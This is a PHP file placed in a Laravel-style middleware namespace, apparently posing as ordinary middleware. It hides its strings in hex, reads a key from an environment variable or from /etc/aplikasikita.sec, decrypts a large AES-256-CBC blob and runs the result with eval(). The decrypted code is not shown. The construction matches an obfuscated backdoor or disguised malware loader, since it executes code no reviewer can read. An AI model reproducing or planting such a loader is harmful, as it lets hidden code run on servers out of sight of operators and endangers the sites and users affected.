<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7fFFaPQOQvbIpQAsUSytVw==');

$c=base64_decode(

'6aCJ0YyFXPqxTXDzCQKurf70Z+Dclm/kRA9bAOWzpZ3rSTDhlUi/XW6RpdFJ0CdqB5talMuX4J52' .
'M3TEKTPl8ajPgkTWWU4dQ0h2/NYlOmuR1u831RaRjLMc+f7hPyMon33r/qltpaQy+qlqhg5R06Xg' .
'Uv0Vo5xlAMdNegX7dBw6weGdFzg2nZLgn9frHsf2WV9zX17aDg2+rqiIqpB+olC0Q5pu3yQDNLqF' .
'p4522UxY4reItM3EZ9+OsC9HVSrmG+lLlATwQzB3JpNdopQNAktjZKjTc0FftMYmYRD2VjntOikY' .
'arjvrCK1FQlZtXEdGyQxwXpb6iaUKFAiLoNbk7Zcy+vwwYMyU3S1U4A981//qUc71+MoOF+NKMoi' .
'DOMguMIJ+gWyGbktgu9Z3D4cDH07/SgRsW9vJ47wf7kzp4+AjptHqSXqIeWkFtsscttNsiYv79Cv' .
'BReD/8CKq8KZGGLfQ8/LY9bE03skoCmuDgJBun3TSPZVHxR+WwZXCq/cflIVYUbw5sut3TOGeB2B' .
'3ys2m8sh6n/4RJCiSW/ajPdRYo5zK2qo4zRPdB40axnY0M4+ZvcsXxRBvxYicafN5ly9wtOAYM9h' .
'FX9F/7UD1fgBdtMScG4hsSGceVUSyFccF4w+VHulSQBBbI/A6EyczAsHUiceEGhzKfqh9+D0wBlN' .
'eUgGr8MfnxTnsLa8sT6ztxBDhCTxUXDLVgLnR2m0jYXM3Dftj8HpUes6MnHKtDhvwNo64ol9wE3U' .
'mZ1BV0J3qCnV/AB/DmQgbx+W7iTwsA5DSgnUmRS+o6GKGx2TTYRcu8ctdakPkgXj+HgA/3F8Vywn' .
'Xd6KBI6FJVr2Fri9bdG0sdic6Rp6A8Z+mEv0sy0aOkhH1Z3UOyuEjCdJEgrZWRPWmECRbTjg3FFO' .
'JyOu3WLG69agVMSDQe8NHVoZFFYxQxMgIYf2HMMo0ZbA9k89AfzXjeU8gZT6psRXfINRRVJmHbQY' .
'c5sb5PC3ajcCZBVPbnkmVXErgcLR9F5ShgNMIDUK1cbSWBCkZrf3rGr/bZ+RtoTEXTRYlhVcKV2J' .
'/JmyY4Qi0bC78o7RIgY7XIqQMs3ZJBdyL/8AHncs0A9m/EBEY04aMTmGiPvTgVJRhOYyIU6u8lXL' .
'mCstXvooooqt+rBuCQc6vPlE2Pd+eLvvjcedJ12SOAM6ahDIJD4qHOkEH3uBf76uU9RO4H0Rggeu' .
'sZwI68aOCDa+9z1HBwc0DLh0ONNyA3w+IG3Klro2J3Mobhib6wmJWlAJaUJpfsZCwuXZTilnGAi5' .
'3dNJATCF1jQzBn6shelYD6qTbFvU/ulXeIGivdbT/7NBrMJj1aQXcQJ1DowdeiyxwgkKwnCscQP0' .
'4+xDB/fkb/virctj0lF5tkgiylf3Dm+1MDIEbt6Xzh+LNneFXPjc1Pq9nmuE0rgPllWQAk4nYNVF' .
'K+iFzvhxEylmSKUXkHeqiaQgtakcbMhF2gSbKkUzw6fpd3CWtr/CpHimVbuR3p+vHPVKfyhNL4OF' .
'nJqXaWDhpfsQyUAVm6vzxsqiyzdpB5NC8bKVTaDib+MkXKeNhdhWEZo/kOlGvjQRNojsxvo/JARn' .
'I2ijuxwCAXC0iNivDvlVyvmJIarkf3cAypZOC2hJzvQVC0wASra5tdfJW7QlkGKBe1Rdq1KEjmRP' .
'ie3VHjSo4cEgje/ap4uYUQGHYa4FEHvD1j5CLsuqHHBGZ3HxJ0ITXe3tTMeYJhFIH9v50NBI0kAM' .
'FMK3NKCqQ/oGWNAqIT5vOCIM69khpXYg3ZhyqCY9J9TFWoAoA9W4NxLd/sPIK9wlGMDmHSXeI/Nb' .
'ngY9uGiL249FnalmA70RAjsRwKs7uSc6UYhzilugY456VMY8XzUot50OKNgwRY4seRbvKVuIvykb' .
'UvsHeAl6IyKhN3lLLMQeU+8RRLcHUSTmkEhFGWoBJzAeGAIf0D8KpKV/lWBoKzYTlx8cEBieSqct' .
'Ul8Chg0/Lqpic6AtwsAqqI0YM8rDn1M2U4aJ8ync9QzD1zMIfgp7h7l16E/hZZK7h1KIBQoB/4Dv' .
'0Erklg/WOIwa9hy8NAqmt9/rO5KVJ33eil5nTgtq54/mF48+LVE6/whTxD/yZoxngPvqwaZRsvXI' .
'kNTFFSYj6mTXOU/OymJDUlMhEQwR52JwLEi8RhgNLCJoeymFEfKKsWh3fUI2ierdJchM3DJdzZQ2' .
'Jxycnk8Q+8MpIEbsFGOm+Nv9SSh/+S9ZWlkH6DL8kRZamyqSGM/tdcA+dgstrYvo1FoKxtsTW3CR' .
'udF2qByJPSYmRh3s31dI1BaXHIU2zMK22qIucZ2i6JkDnzqoawlgWUmdc3hzjqX0atFPC7/0VI8o' .
'UbSWwHoLTHHpW4/dPxI4j8bc7q0Ik0W7CSKQNIVbo74SA0NfzERUBgijxhN2NpbCoSfqd+jIWYqE' .
'mE4/mOMa+kr4fuaq4ChVJzlxccfhXe+zBL7ZRcyu1toY0tjiASWVqcinW8per4K0Umtca5bPgtwf' .
'xjstmeeHtsjsigVbSKGENTRFYR8B6ZHq/cj+feA60Oy3ab6ppinIUMm5PB8LQ6KO8ECKqmILgBxZ' .
'BDtNlFP3XIhQ+8PesD7e7zYyHufWo5yT6M0TFzq6iDK1rk+yAqdvHl5CRGBwaGv9+NErl7+aeKV1' .
'HEtO9N9OjCvqzANiBYoF5XSZ/zuUI5TL4qcNSQ+hK9KMMf+9/ae9ZgAMxB7IaBfZCP/nQJWj2A0X' .
'd61Y3CxPuIXw9znFfrG+QgSF6MrhJCWiXk+krF500F77Mno6SbiSwosLKA159d9bCv0lUvOS/46c' .
'7Pb4TJc5fhCa2WYREb+Zue5heIbK6jLXfXEfKpREJICzaliVY31hDtUEZ9MqNPNZ1ZnQ5cH0KbOj' .
'tpPBtAFtqufsMkCqUi0PP1MiJQop2VycKGmJWWgbYcU+GneDFikwD5kHQkWtvprvfyhKP/v4sgGq' .
'EZsw6XWU9IxnD3W+vxIe+a3emMVZpqqcfUv7TcEnUQ6DlxJEdWWNqAbszsOnEPPZ0pOPhqEirwm4' .
't8Tg7Ey5zgJDHNrUHup2SHIUg70lbtjUFMqVjROzrRYSpwl/ezxDkE1m2MICPnjNsvyCUkisQPCF' .
'DfCtKn1SxrDrBPuzERk/inbDmx3dHl/IO4LbpgxrHmeDZpMCcwpF/1zKjSbL/FndpaWdjBOqSBMU' .
'Pq55wYZmVvSvdnUtiflhu/5oovPl2uQpx5DyW1bS3HbYJp6r5jP/LS1kNa5FXbMy0zkfWX+Pc/ug' .
'DbV7AbP1iZO3eV+ZIc00j0crLHdSh66Z2wyafG17XRXAiCP6GENnwV3bu37dQCSj18s1Z9WMSSys' .
'UjyMaEEWctx9HYDUM82i9KPcbCx564z1aEwgTZkI6Mc4U/NIpVDa4q0myNP2gV70LLirCzTY5ACz' .
'SQ427P09oCPzTxF+y3xEXgAbIdLfRzgOihYq2R8+YHZynCvtUyZl6TL9G4WVDGiK4yMCgPbqlvFp' .
'F7q+qFUZuuq2a/4HzRpvFCHa/tzbXnUA96eM3+fPutuZiT3+GFty5r5QCaLd1yh2uTUkptLTPzMC' .
'Gq0YKgXELaAbB/gS/4Aeah6RYYA5hA3Qy26T1U/yo3l3vS3+bp/9dqQFKlGVfygyYaDR/ds9MWfs' .
'KP6qw5+ci4A+yoUmtLSZey8qnskRQ/6h6JFggrLCQe4uxSCLuUYIRlEgbnDLlm6u+RDTvxfDKqTy' .
'JWdhAYH4SM2fO0Vzhgemibc+1fDFuPua5bg+sdKamAhiwd6+dYhquy//sS1PiAX43RlImTblME3X' .
'qZ7pM2xBSejbTwRmDSGtAmMlWemkhgaoQJuWytQl'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

